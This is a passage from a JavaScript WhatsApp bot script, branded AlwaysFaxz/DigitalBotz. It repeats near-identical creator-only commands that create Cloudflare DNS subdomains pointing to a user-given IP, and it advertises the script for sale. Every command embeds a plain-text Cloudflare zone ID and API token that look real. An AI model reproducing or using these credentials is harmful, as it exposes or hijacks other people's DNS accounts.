"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd19': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "8080d914883ed0b9e17d281f593df945";
               let apitoken = "BP2uUPgVfrM4pHW_ivo2AawAyiLqOMYoLYyS2BF7"
               let tld = "sellerpanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd20': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "6c4af9293eed7ea87c94d8effe5f2de2";
               let apitoken = "fxR0JgMIVwd0wvGIeBTymygdSMx1yNAN12lN8ure"
               let tld = "panellprivate.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd21': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "cada0ecef8f1e8d904435d469aef1b05";
               let apitoken = "54kx4yvi3CBqomC99WSaqZo9tbxHoe9U"
               let tld = "mypanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd22': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d318f96a6327c5340d136415e860f545";
               let apitoken = "RTe9hBdh_-nt0wzOvYN183JyQC011yaiodQ7Po1b"
               let tld = "kangpanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd23': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "8132a433dc4eea653e38e168f2f45fc0";
               let apitoken = "33F2gfJ0cEoLv4NlEqLYGd6Ahc5_dzyUH_ClKuX_"
               let tld = "jasapanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd24': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5024bc4a02924cf69ddf4dfa6ee96069";
               let apitoken = "OajJ0jtCB0FTFwfdiTB_ktzNKFWAmsENFdlE4Hvd"
               let tld = "dewapanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd25': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "98264c6c53c5bc9080230b077422d748";
               let apitoken = "1W9IHC9mLAKj8hQaMjczy0gA3Of7kPjJ3gAvTlnZ"
               let tld = "adminpanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd26': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "9b28f4ad0f06b36dd94cc56b01efc19a";
               let apitoken = "bMiZlOhkSzozUq1jMLO5bk4OeZr0GllyVtVWX1F4"
               let tld = "plerkuda.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd27': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "2bb49b2de0cbf75c0462ed90d7d333e1";
               let apitoken = "lZ0XMXdnwp2L1DsI3f8frkPwvkQ6ENee2PnAfOsY"
               let tld = "cafegt.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd28': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d28c394ba64bf4ecfec1917829d8bced";
               let apitoken = "86ZA4NPGG6ijzlhuRKqc3X3qbH8mgvlzOPsrBApB"
               let tld = "shopwebsite.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
